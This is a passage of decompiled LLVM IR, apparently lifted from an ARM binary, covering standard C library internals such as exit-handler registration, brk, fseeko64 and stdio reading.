  store i8 1, i8* %v5_19a54, align 1
  store i32 -554899859, i32* %r3.global-to-local, align 4
  %v4_19a5c = sdiv i32 %tmp2, 256
  store i32 %v4_19a5c, i32* %lr.global-to-local, align 4
  %v4_19a60 = sdiv i32 %tmp2, 16777216
  store i32 %v4_19a60, i32* %r2.global-to-local, align 4
  %v5_19a64 = add i32 %arg2, 2
  %v6_19a64 = inttoptr i32 %v5_19a64 to i8*
  store i8 %arg1, i8* %v6_19a64, align 1
  store i32 5, i32* %r4.global-to-local, align 4
  %v0_19a6c = load i32, i32* %ip.global-to-local, align 4
  %v0_19a70 = load i32, i32* %r2.global-to-local, align 4
  %v1_19a70 = trunc i32 %v0_19a70 to i8
  %v4_19a70 = add i32 %arg2, 5
  %v5_19a70 = inttoptr i32 %v4_19a70 to i8*
  store i8 %v1_19a70, i8* %v5_19a70, align 1
  %v0_19a74 = load i32, i32* %lr.global-to-local, align 4
  %v1_19a74 = trunc i32 %v0_19a74 to i8
  %v4_19a74 = add i32 %arg2, 3
  %v5_19a74 = inttoptr i32 %v4_19a74 to i8*
  store i8 %v1_19a74, i8* %v5_19a74, align 1
  %v0_19a78 = load i32, i32* %ip.global-to-local, align 4
  %v1_19a78 = trunc i32 %v0_19a78 to i8
  %v4_19a78 = add i32 %arg2, 15
  %v5_19a78 = inttoptr i32 %v4_19a78 to i8*
  store i8 %v1_19a78, i8* %v5_19a78, align 1
  %v0_19a7c = load i32, i32* %r3.global-to-local, align 4
  %v3_19a7c = add i32 %arg2, 16
  %v4_19a7c = inttoptr i32 %v3_19a7c to i32*
  store i32 %v0_19a7c, i32* %v4_19a7c, align 4
  %v0_19a80 = load i32, i32* %r4.global-to-local, align 4
  %v3_19a80 = add i32 %arg2, 20
  %v4_19a80 = inttoptr i32 %v3_19a80 to i32*
  store i32 %v0_19a80, i32* %v4_19a80, align 4
  %v0_19a84 = load i32, i32* %ip.global-to-local, align 4
  %v1_19a84 = trunc i32 %v0_19a84 to i8
  %v4_19a84 = add i32 %arg2, 13
  %v5_19a84 = inttoptr i32 %v4_19a84 to i8*
  store i8 %v1_19a84, i8* %v5_19a84, align 1
  ret i32 %v0_19a6c

; uselistorder directives
  uselistorder i32 %tmp2, { 1, 2, 0 }
}

define i32 @__exit_handler(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19a90 = load i32, i32* @r4, align 4
  store i32 %v3_19a90, i32* %stack_var_-8, align 4
  br label %.thread1

dec_label_pc_19a9c:                               ; preds = %.thread1
  store i32 %v2_19b10, i32* %r3.global-to-local, align 4
  %v2_19aa0 = add i32 %v2_19b10, %v3_19b04
  %v3_19aa0 = inttoptr i32 %v2_19aa0 to i32*
  %v4_19aa0 = load i32, i32* %v3_19aa0, align 4
  %v7_19aa4 = icmp eq i32 %v4_19aa0, 2
  store i32 %v1_19afc, i32* @global_var_301f8.971, align 4
  store i32 %v2_19aa0, i32* %r3.global-to-local, align 4
  br i1 %v7_19aa4, label %dec_label_pc_19ac0, label %dec_label_pc_19ab4

dec_label_pc_19ab4:                               ; preds = %dec_label_pc_19a9c
  %v7_19ab4 = icmp eq i32 %v4_19aa0, 3
  br i1 %v7_19ab4, label %dec_label_pc_19ae0, label %.thread1

dec_label_pc_19ac0:                               ; preds = %dec_label_pc_19a9c
  %v1_19ac0 = add i32 %v2_19aa0, 4
  %v2_19ac0 = inttoptr i32 %v1_19ac0 to i32*
  %v3_19ac0 = load i32, i32* %v2_19ac0, align 4
  %v2_19ac4 = icmp eq i32 %v3_19ac0, 0
  br i1 %v2_19ac4, label %.thread1, label %dec_label_pc_19ad0

dec_label_pc_19ad0:                               ; preds = %dec_label_pc_19ac0
  call void @__pseudo_branch(i32 %v3_19ac0)
  br label %.thread1

dec_label_pc_19ae0:                               ; preds = %dec_label_pc_19ab4
  %v1_19ae0 = add i32 %v2_19aa0, 4
  %v2_19ae0 = inttoptr i32 %v1_19ae0 to i32*
  %v3_19ae0 = load i32, i32* %v2_19ae0, align 4
  %v2_19ae4 = icmp eq i32 %v3_19ae0, 0
  br i1 %v2_19ae4, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_19ae0
  call void @__pseudo_branch(i32 %v3_19ae0)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_19ae0, %dec_label_pc_19ab4, %dec_label_pc_19ac0, %dec_label_pc_19ad0, %bb, %entry
  %v2_19af8 = load i32, i32* @global_var_301f8.971, align 4
  store i32 %v2_19af8, i32* %r3.global-to-local, align 4
  %v1_19afc = add i32 %v2_19af8, -1
  %v2_19b00 = icmp eq i32 %v2_19af8, 0
  %v3_19b04 = mul i32 %v1_19afc, 16
  store i32 %v3_19b04, i32* %ip.global-to-local, align 4
  %v2_19b10 = load i32, i32* @global_var_301fc.973, align 4
  br i1 %v2_19b00, label %dec_label_pc_19b10, label %dec_label_pc_19a9c

dec_label_pc_19b10:                               ; preds = %.thread1
  store i32 %v2_19b10, i32* @r0, align 4
  %v2_19b14 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19b14, i32* @r4, align 4
  %v0_19b18 = call i32 @free()
  %v0_19b1c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19b1c, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_19b10
  %v3_19b1c = load i32, i32* %r3.global-to-local, align 4
  %v4_19b1c = inttoptr i32 %v3_19b1c to i32*
  store i32 %v0_19b18, i32* %v4_19b1c, align 4
  %v5_19b1c = load i32, i32* @r8, align 4
  %v6_19b1c = load i32, i32* %r3.global-to-local, align 4
  %v7_19b1c = sub i32 %v6_19b1c, %v5_19b1c
  store i32 %v7_19b1c, i32* %r3.global-to-local, align 4
  %v4_19b20 = inttoptr i32 %v7_19b1c to i32*
  store i32 %v0_19b18, i32* %v4_19b20, align 4
  %v5_19b20 = load i32, i32* %ip.global-to-local, align 4
  %v6_19b20 = load i32, i32* %r3.global-to-local, align 4
  %v7_19b20 = sub i32 %v6_19b20, %v5_19b20
  store i32 %v7_19b20, i32* %r3.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_19b10, %bb5
  ret i32 %v0_19b18

; uselistorder directives
  uselistorder i32 %v0_19b18, { 0, 2, 1 }
  uselistorder i32 %v2_19b10, { 0, 2, 1 }
  uselistorder i32 %v2_19aa0, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 5, 6, 7, 3, 4 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %.thread1, { 4, 0, 3, 2, 1, 5 }
}

define i32 @__new_exitfn() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_19b24 = load i32, i32* @r4, align 4
  %v6_19b24 = load i32, i32* @r5, align 4
  %v2_19b28 = ptrtoint i32* %stack_var_-32 to i32
  store i32 ptrtoint (i32* @global_var_2b878.758 to i32), i32* @r2, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v2_19b28, i32* @r0, align 4
  store i32 58060, i32* %r3.global-to-local, align 4
  store i32 105284, i32* %lr.global-to-local, align 4
  %v1_19b40 = call i32 @__pthread_cleanup_push_defer()
  store i32 62768, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2b878.758 to i32), i32* %r0.global-to-local, align 4
  store i32 105300, i32* @lr, align 4
  %v2_19b50 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b878.758 to i32))
  store i32 %v2_19b50, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_30200.980 to i32), i32* @r5, align 4
  %v2_19b5c = load i32, i32* @global_var_301f8.971, align 4
  %v2_19b60 = load i32, i32* @global_var_30200.980, align 4
  store i32 %v2_19b60, i32* %r2.global-to-local, align 4
  %v1_19b64 = add i32 %v2_19b5c, 1
  store i32 %v1_19b64, i32* %r3.global-to-local, align 4
  %v3_19b68 = mul i32 %v2_19b60, 16
  store i32 ptrtoint (i32* @global_var_301fc.973 to i32), i32* @r6, align 4
  %v1_19b74 = add i32 %v3_19b68, 320
  store i32 %v1_19b74, i32* %r1.global-to-local, align 4
  %v6_19b78 = icmp slt i32 %v2_19b60, %v1_19b64
  br i1 %v6_19b78, label %dec_label_pc_19b7c, label %dec_label_pc_19bac

dec_label_pc_19b7c:                               ; preds = %entry
  %v2_19b7c = load i32, i32* @global_var_301fc.973, align 4
  store i32 %v2_19b7c, i32* %r0.global-to-local, align 4
  %v2_19b80 = call i32 @realloc(i32 %v2_19b7c, i32 %v1_19b74)
  store i32 %v2_19b80, i32* %r0.global-to-local, align 4
  store i32 %v2_19b80, i32* @r4, align 4
  %v2_19b84 = icmp eq i32 %v2_19b80, 0
  br i1 %v2_19b84, label %dec_label_pc_19b8c, label %dec_label_pc_19b9c

dec_label_pc_19b8c:                               ; preds = %dec_label_pc_19b7c
  %v0_19b8c = call i32 @__errno_location()
  store i32 %v0_19b8c, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_19b94 = inttoptr i32 %v0_19b8c to i32*
  store i32 12, i32* %v2_19b94, align 4
  br label %dec_label_pc_19be0

dec_label_pc_19b9c:                               ; preds = %dec_label_pc_19b7c
  %v2_19b9c = load i32, i32* @global_var_30200.980, align 4
  %v1_19ba0 = add i32 %v2_19b9c, 20
  store i32 %v1_19ba0, i32* %r3.global-to-local, align 4
  %v1_19ba4 = load i32, i32* @r6, align 4
  %v2_19ba4 = inttoptr i32 %v1_19ba4 to i32*
  store i32 %v2_19b80, i32* %v2_19ba4, align 4
  %v0_19ba8 = load i32, i32* %r3.global-to-local, align 4
  %v1_19ba8 = load i32, i32* @r5, align 4
  %v2_19ba8 = inttoptr i32 %v1_19ba8 to i32*
  store i32 %v0_19ba8, i32* %v2_19ba8, align 4
  %v2_19bb4.pre = load i32, i32* @global_var_301f8.971, align 4
  br label %dec_label_pc_19bac

dec_label_pc_19bac:                               ; preds = %entry, %dec_label_pc_19b9c
  %v2_19bb4 = phi i32 [ %v2_19b5c, %entry ], [ %v2_19bb4.pre, %dec_label_pc_19b9c ]
  store i32 ptrtoint (i32* @global_var_301f8.971 to i32), i32* %lr.global-to-local, align 4
  %v2_19bb8 = load i32, i32* @global_var_301fc.973, align 4
  store i32 %v2_19bb8, i32* %r0.global-to-local, align 4
  %v1_19bbc = add i32 %v2_19bb4, 1
  store i32 %v1_19bbc, i32* %ip.global-to-local, align 4
  %v3_19bc4 = mul i32 %v2_19bb4, 16
  store i32 %v3_19bc4, i32* %r2.global-to-local, align 4
  %v3_19bc8 = add i32 %v2_19bb8, %v3_19bc4
  %v4_19bc8 = inttoptr i32 %v3_19bc8 to i32*
  store i32 1, i32* %v4_19bc8, align 4
  store i32 105104, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_300b8.762 to i32), i32* %r3.global-to-local, align 4
  %v0_19bd4 = load i32, i32* %ip.global-to-local, align 4
  %v1_19bd4 = load i32, i32* %lr.global-to-local, align 4
  %v2_19bd4 = inttoptr i32 %v1_19bd4 to i32*
  store i32 %v0_19bd4, i32* %v2_19bd4, align 4
  %v0_19bd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_19bd8 = load i32, i32* %r3.global-to-local, align 4
  %v2_19bd8 = inttoptr i32 %v1_19bd8 to i32*
  store i32 %v0_19bd8, i32* %v2_19bd8, align 4
  %v0_19bdc = load i32, i32* %r2.global-to-local, align 4
  %v1_19bdc = load i32, i32* %r0.global-to-local, align 4
  %v2_19bdc = add i32 %v1_19bdc, %v0_19bdc
  store i32 %v2_19bdc, i32* @r4, align 4
  br label %dec_label_pc_19be0

dec_label_pc_19be0:                               ; preds = %dec_label_pc_19b8c, %dec_label_pc_19bac
  store i32 %v2_19b28, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 58236, i32* %r3.global-to-local, align 4
  store i32 105460, i32* @lr, align 4
  %v1_19bf0 = call i32 @__pthread_cleanup_pop_restore()
  %v0_19bf4 = load i32, i32* @r4, align 4
  store i32 %v0_19bf4, i32* %r0.global-to-local, align 4
  store i32 %v3_19b24, i32* @r4, align 4
  store i32 %v6_19b24, i32* @r5, align 4
  ret i32 %v0_19bf4

; uselistorder directives
  uselistorder i32 %v3_19bc4, { 1, 0 }
  uselistorder i32 %v2_19b60, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 7, 4, 5, 6 }
  uselistorder i32 ()* @__pthread_cleanup_pop_restore, { 21, 19, 9, 8, 7, 6, 5, 4, 2, 0, 3, 23, 22, 20, 1, 13, 12, 15, 14, 11, 10, 18, 17, 16 }
  uselistorder i32* @global_var_300b8.762, { 1, 0 }
  uselistorder i32 (i32, i32)* @realloc, { 1, 2, 0 }
  uselistorder i32* @global_var_301fc.973, { 0, 1, 3, 2 }
  uselistorder i32* @global_var_301f8.971, { 4, 0, 2, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_2b878.758 to i32), { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_19be0, { 1, 0 }
  uselistorder label %dec_label_pc_19bac, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19c28 = add i32 %arg1, 28
  %v2_19c28 = inttoptr i32 %v1_19c28 to i32*
  %v3_19c28 = load i32, i32* %v2_19c28, align 4
  %v1_19c30 = add i32 %arg1, 44
  %v2_19c30 = inttoptr i32 %v1_19c30 to i32*
  %v3_19c30 = load i32, i32* %v2_19c30, align 4
  store i32 %v3_19c28, i32* @global_var_303b8.986, align 4
  store i32 %v3_19c30, i32* @global_var_303bc.988, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_19c54 = call i32 @brk(i32* %arg1)
  %v3_19c58 = icmp ult i32 %v2_19c54, %tmp
  store i32 0, i32* @r2, align 4
  store i32 %v2_19c54, i32* @global_var_30204.836, align 4
  br i1 %v3_19c58, label %dec_label_pc_19c6c, label %dec_label_pc_19c7c

dec_label_pc_19c6c:                               ; preds = %entry
  %v0_19c6c = call i32 @__errno_location()
  %v2_19c74 = inttoptr i32 %v0_19c6c to i32*
  store i32 12, i32* %v2_19c74, align 4
  store i32 -1, i32* @r2, align 4
  br label %dec_label_pc_19c7c

dec_label_pc_19c7c:                               ; preds = %entry, %dec_label_pc_19c6c
  %v0_19c7c = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_19c6c ]
  ret i32 %v0_19c7c

; uselistorder directives
  uselistorder i32* @global_var_30204.836, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19c7c, { 1, 0 }
}

define i32 @__cmsg_nxthdr() local_unnamed_addr {
entry:
  %v0_19c88 = load i32, i32* @r1, align 4
  %v1_19c88 = inttoptr i32 %v0_19c88 to i32*
  %v2_19c88 = load i32, i32* %v1_19c88, align 4
  %v1_19c8c = add i32 %v2_19c88, 3
  %v1_19c90 = and i32 %v1_19c8c, -4
  %v2_19c94 = add i32 %v1_19c90, %v0_19c88
  %tmp = icmp ult i32 %v2_19c88, 12
  br i1 %tmp, label %dec_label_pc_19cd4, label %dec_label_pc_19ca8

dec_label_pc_19ca8:                               ; preds = %entry
  %v1_19ca0 = add i32 %v2_19c94, 12
  %v0_19ca8 = load i32, i32* @r0, align 4
  %v1_19ca8 = add i32 %v0_19ca8, 16
  %v1_19cac = inttoptr i32 %v1_19ca8 to i32*
  %v2_19cac = load i32, i32* %v1_19cac, align 4
  %v3_19cac = add i32 %v0_19ca8, 20
  %v4_19cac = inttoptr i32 %v3_19cac to i32*
  %v5_19cac = load i32, i32* %v4_19cac, align 4
  %v2_19cb0 = add i32 %v5_19cac, %v2_19cac
  %tmp3 = icmp ugt i32 %v1_19ca0, %v2_19cb0
  br i1 %tmp3, label %dec_label_pc_19cd4, label %dec_label_pc_19cbc

dec_label_pc_19cbc:                               ; preds = %dec_label_pc_19ca8
  %v3_19cbc = inttoptr i32 %v2_19c94 to i32*
  %v4_19cbc = load i32, i32* %v3_19cbc, align 4
  %v1_19cc0 = add i32 %v4_19cbc, 3
  %v1_19cc4 = and i32 %v1_19cc0, -4
  %v2_19cc8 = add i32 %v1_19cc4, %v2_19c94
  %tmp4 = icmp ugt i32 %v2_19cc8, %v2_19cb0
  br i1 %tmp4, label %dec_label_pc_19cd4, label %dec_label_pc_19cd8

dec_label_pc_19cd4:                               ; preds = %dec_label_pc_19cbc, %dec_label_pc_19ca8, %entry
  br label %dec_label_pc_19cd8

dec_label_pc_19cd8:                               ; preds = %dec_label_pc_19cbc, %dec_label_pc_19cd4
  %v0_19cd8 = phi i32 [ %v2_19c94, %dec_label_pc_19cbc ], [ 0, %dec_label_pc_19cd4 ]
  ret i32 %v0_19cd8

; uselistorder directives
  uselistorder i32 %v2_19c94, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19cd8, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_19ce0 = load i32, i32* @r2, align 4
  store i32 %v0_19ce0, i32* @r3, align 4
  %v0_19ce8 = call i32 @__GI_fseeko64()
  ret i32 %v0_19ce8
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_19d28 = load i32, i32* @r4, align 4
  %v6_19d28 = load i32, i32* @r5, align 4
  %v9_19d28 = load i32, i32* @r6, align 4
  %v12_19d28 = load i32, i32* @r7, align 4
  %v0_19d2c = load i32, i32* @r3, align 4
  %v2_19d30 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_19d2c, i32* @r6, align 4
  %v0_19d38 = load i32, i32* @r0, align 4
  store i32 %v0_19d38, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_19d2c, 3
  br i1 %tmp, label %dec_label_pc_19d54, label %dec_label_pc_19d40

dec_label_pc_19d40:                               ; preds = %entry
  %v0_19d40 = call i32 @__errno_location()
  store i32 %v0_19d40, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_19d4c = inttoptr i32 %v0_19d40 to i32*
  store i32 22, i32* %v2_19d4c, align 4
  br label %.thread3

dec_label_pc_19d54:                               ; preds = %entry
  %v1_19d54 = add i32 %v0_19d38, 52
  %v2_19d54 = inttoptr i32 %v1_19d54 to i32*
  %v3_19d54 = load i32, i32* %v2_19d54, align 4
  store i32 %v3_19d54, i32* @r7, align 4
  %v2_19d58 = icmp eq i32 %v3_19d54, 0
  %v0_19d5c = load i32, i32* @r1, align 4
  store i32 %v0_19d5c, i32* %stack_var_-28, align 4
  br i1 %v2_19d58, label %dec_label_pc_19d68, label %dec_label_pc_19d94

dec_label_pc_19d68:                               ; preds = %dec_label_pc_19d54
  %v1_19d68 = add i32 %v0_19d38, 56
  store i32 %v1_19d68, i32* @r4, align 4
  store i32 58060, i32* %r3.global-to-local, align 4
  store i32 %v2_19d30, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 %v1_19d68, i32* @r2, align 4
  %v1_19d80 = call i32 @__pthread_cleanup_push_defer()
  %v0_19d84 = load i32, i32* @r4, align 4
  store i32 %v0_19d84, i32* %r0.global-to-local, align 4
  store i32 62768, i32* %r3.global-to-local, align 4
  store i32 105876, i32* @lr, align 4
  %v2_19d90 = call i32 @pthread_mutex_lock(i32 %v0_19d84)
  store i32 %v2_19d90, i32* %r0.global-to-local, align 4
  %v0_19d94.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19d94

dec_label_pc_19d94:                               ; preds = %dec_label_pc_19d54, %dec_label_pc_19d68
  %v0_19da0 = phi i32 [ %v0_19d38, %dec_label_pc_19d54 ], [ %v0_19d94.pre, %dec_label_pc_19d68 ]
  %v1_19d94 = inttoptr i32 %v0_19da0 to i8*
  %v2_19d94 = load i8, i8* %v1_19d94, align 1
  %v3_19d94 = zext i8 %v2_19d94 to i32
  store i32 %v3_19d94, i32* %r3.global-to-local, align 4
  %v1_19d98 = and i32 %v3_19d94, 64
  %v2_19d98 = icmp eq i32 %v1_19d98, 0
  br i1 %v2_19d98, label %dec_label_pc_19db0, label %dec_label_pc_19da0

dec_label_pc_19da0:                               ; preds = %dec_label_pc_19d94
  store i32 %v0_19da0, i32* @r0, align 4
  %v0_19da4 = call i32 @__stdio_wcommit()
  store i32 %v0_19da4, i32* %r0.global-to-local, align 4
  %v2_19da8 = icmp eq i32 %v0_19da4, 0
  br i1 %v2_19da8, label %dec_label_pc_19db0, label %dec_label_pc_19e20

dec_label_pc_19db0:                               ; preds = %dec_label_pc_19da0, %dec_label_pc_19d94
  %v0_19db0 = load i32, i32* @r6, align 4
  %v7_19db0 = icmp eq i32 %v0_19db0, 1
  br i1 %v7_19db0, label %dec_label_pc_19db8, label %dec_label_pc_19db0.dec_label_pc_19dcc_crit_edge

dec_label_pc_19db0.dec_label_pc_19dcc_crit_edge:  ; preds = %dec_label_pc_19db0
  br label %dec_label_pc_19dcc

dec_label_pc_19db8:                               ; preds = %dec_label_pc_19db0
  %v0_19db8 = load i32, i32* @r5, align 4
  store i32 %v0_19db8, i32* %r0.global-to-local, align 4
  %v2_19dbc = ptrtoint i32* %stack_var_-28 to i32
  %v2_19dc0 = inttoptr i32 %v0_19db8 to i8*
  %v3_19dc0 = call i32 @__stdio_adjust_position(i8* %v2_19dc0, i32 %v2_19dbc)
  store i32 %v3_19dc0, i32* %r0.global-to-local, align 4
  %v1_19dc4 = icmp slt i32 %v3_19dc0, 0
  br i1 %v1_19dc4, label %dec_label_pc_19e20, label %dec_label_pc_19db8.dec_label_pc_19dcc_crit_edge

dec_label_pc_19db8.dec_label_pc_19dcc_crit_edge:  ; preds = %dec_label_pc_19db8
  %v0_19dcc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_19dcc

dec_label_pc_19dcc:                               ; preds = %dec_label_pc_19db0.dec_label_pc_19dcc_crit_edge, %dec_label_pc_19db8.dec_label_pc_19dcc_crit_edge
  %v0_19dcc = phi i32 [ %v0_19db0, %dec_label_pc_19db0.dec_label_pc_19dcc_crit_edge ], [ %v0_19dcc.pre, %dec_label_pc_19db8.dec_label_pc_19dcc_crit_edge ]
  store i32 %v0_19dcc, i32* %r2.global-to-local, align 4
  %v0_19dd0 = load i32, i32* @r5, align 4
  store i32 %v0_19dd0, i32* %r0.global-to-local, align 4
  %v4_19dd8 = call i32 @__stdio_seek(i32 %v0_19dd0, i32* nonnull %stack_var_-28, i32 %v0_19dcc)
  store i32 %v4_19dd8, i32* %r0.global-to-local, align 4
  %v1_19ddc = icmp slt i32 %v4_19dd8, 0
  br i1 %v1_19ddc, label %dec_label_pc_19e20, label %dec_label_pc_19de4

dec_label_pc_19de4:                               ; preds = %dec_label_pc_19dcc
  %v0_19de4 = load i32, i32* @r5, align 4
  %v1_19de4 = inttoptr i32 %v0_19de4 to i32*
  %v2_19de4 = load i32, i32* %v1_19de4, align 4
  store i32 %v2_19de4, i32* %r3.global-to-local, align 4
  %v1_19de8 = add i32 %v0_19de4, 8
  %v2_19de8 = inttoptr i32 %v1_19de8 to i32*
  %v3_19de8 = load i32, i32* %v2_19de8, align 4
  store i32 %v3_19de8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_19df0 = and i32 %v2_19de4, -72
  store i32 %v1_19df0, i32* %r3.global-to-local, align 4
  %v3_19df4 = sdiv i32 %v2_19de4, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_19dfc = trunc i32 %v3_19df4 to i8
  %v3_19dfc = add i32 %v0_19de4, 1
  %v4_19dfc = inttoptr i32 %v3_19dfc to i8*
  store i8 %v1_19dfc, i8* %v4_19dfc, align 1
  %v0_19e00 = load i32, i32* %r2.global-to-local, align 4
  %v1_19e00 = load i32, i32* @r5, align 4
  %v2_19e00 = add i32 %v1_19e00, 28
  %v3_19e00 = inttoptr i32 %v2_19e00 to i32*
  store i32 %v0_19e00, i32* %v3_19e00, align 4
  %v0_19e04 = load i32, i32* %r0.global-to-local, align 4
  %v1_19e04 = trunc i32 %v0_19e04 to i8
  %v2_19e04 = load i32, i32* @r5, align 4
  %v3_19e04 = add i32 %v2_19e04, 2
  %v4_19e04 = inttoptr i32 %v3_19e04 to i8*
  store i8 %v1_19e04, i8* %v4_19e04, align 1
  %v0_19e08 = load i32, i32* %r3.global-to-local, align 4
  %v1_19e08 = trunc i32 %v0_19e08 to i8
  %v2_19e08 = load i32, i32* @r5, align 4
  %v3_19e08 = inttoptr i32 %v2_19e08 to i8*
  store i8 %v1_19e08, i8* %v3_19e08, align 1
  %v0_19e0c = load i32, i32* %r2.global-to-local, align 4
  %v1_19e0c = load i32, i32* @r5, align 4
  %v2_19e0c = add i32 %v1_19e0c, 16
  %v3_19e0c = inttoptr i32 %v2_19e0c to i32*
  store i32 %v0_19e0c, i32* %v3_19e0c, align 4
  %v0_19e10 = load i32, i32* %r2.global-to-local, align 4
  %v1_19e10 = load i32, i32* @r5, align 4
  %v2_19e10 = add i32 %v1_19e10, 20
  %v3_19e10 = inttoptr i32 %v2_19e10 to i32*
  store i32 %v0_19e10, i32* %v3_19e10, align 4
  %v0_19e14 = load i32, i32* %r2.global-to-local, align 4
  %v1_19e14 = load i32, i32* @r5, align 4
  %v2_19e14 = add i32 %v1_19e14, 24
  %v3_19e14 = inttoptr i32 %v2_19e14 to i32*
  store i32 %v0_19e14, i32* %v3_19e14, align 4
  %v0_19e18 = load i32, i32* %r0.global-to-local, align 4
  %v1_19e18 = load i32, i32* @r5, align 4
  %v2_19e18 = add i32 %v1_19e18, 44
  %v3_19e18 = inttoptr i32 %v2_19e18 to i32*
  store i32 %v0_19e18, i32* %v3_19e18, align 4
  br label %dec_label_pc_19e24

dec_label_pc_19e20:                               ; preds = %dec_label_pc_19da0, %dec_label_pc_19dcc, %dec_label_pc_19db8
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19e24

dec_label_pc_19e24:                               ; preds = %dec_label_pc_19de4, %dec_label_pc_19e20
  %v0_19e24 = load i32, i32* @r7, align 4
  %v2_19e24 = icmp eq i32 %v0_19e24, 0
  br i1 %v2_19e24, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_19e24
  store i32 %v2_19d30, i32* %r0.global-to-local, align 4
  store i32 58236, i32* %r3.global-to-local, align 4
  store i32 106044, i32* @lr, align 4
  call void @__pseudo_branch(i32 58236)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_19e24, %dec_label_pc_19d40, %bb
  %v0_19e3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_19e3c, i32* %r0.global-to-local, align 4
  store i32 %v3_19d28, i32* @r4, align 4
  store i32 %v6_19d28, i32* @r5, align 4
  store i32 %v9_19d28, i32* @r6, align 4
  store i32 %v12_19d28, i32* @r7, align 4
  ret i32 %v0_19e3c

; uselistorder directives
  uselistorder i32 %v0_19dcc, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 9, 10, 11, 12, 1, 0, 3, 2, 5, 7, 4, 6 }
  uselistorder i32 22, { 30, 51, 31, 32, 43, 33, 34, 35, 36, 49, 50, 37, 52, 18, 48, 38, 39, 40, 0, 19, 44, 45, 1, 47, 2, 46, 3, 10, 12, 24, 4, 20, 21, 8, 22, 11, 5, 6, 7, 13, 25, 14, 26, 9, 15, 27, 16, 28, 17, 29, 23, 53, 41, 42 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19e24, { 1, 0 }
  uselistorder label %dec_label_pc_19e20, { 1, 2, 0 }
  uselistorder label %dec_label_pc_19dcc, { 1, 0 }
  uselistorder label %dec_label_pc_19d94, { 1, 0 }
}

define i32 @__stdio_READ(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19e58 = load i32, i32* @r4, align 4
  store i32 %v3_19e58, i32* %stack_var_-12, align 4
  %v6_19e58 = load i32, i32* @r5, align 4
  %v3_19e5c = load i8, i8* %arg1, align 1
  %v4_19e5c = zext i8 %v3_19e5c to i32
  store i32 %v4_19e5c, i32* %r3.global-to-local, align 4
  %v1_19e60 = and i32 %v4_19e5c, 4
  store i32 %v1_19e60, i32* @r5, align 4
  %v2_19e60 = icmp eq i32 %v1_19e60, 0
